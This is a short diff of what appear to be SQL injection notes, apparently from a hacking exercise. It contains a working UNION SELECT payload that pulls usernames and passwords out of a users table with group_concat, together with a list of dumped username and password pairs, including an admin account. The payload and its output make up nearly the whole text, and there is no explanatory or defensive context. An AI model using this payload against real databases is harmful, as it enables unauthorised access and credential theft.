@@ -29,13 +29,15 @@ union select null,column_name from information_schema.columns where table_schema
 -- user_type
 -- sec_code
 
-union%20select%20null,group_concat(username,0x09,password,0x0a)%20from%20(select%20username,password%20from%20users%20limit%200,10)a
+union select null,group_concat(username,0x09,password,0x0a) from (select username,password from users limit 0,10)a
 
- injector	khan
- decompiler	hacktract
- devilhunte	dante
- Zen	sec-idiots
- Zenodermus	security-i
- grayhat	hacker
- khan	haxor
- admin	sadmin
+ --injector	khan
+ --decompiler	hacktract
+ --devilhunte	dante
+ --Zen	sec-idiots
+ --Zenodermus	security-i
+ --grayhat	hacker
+ --khan	haxor
+ --admin	sadmin
+
+
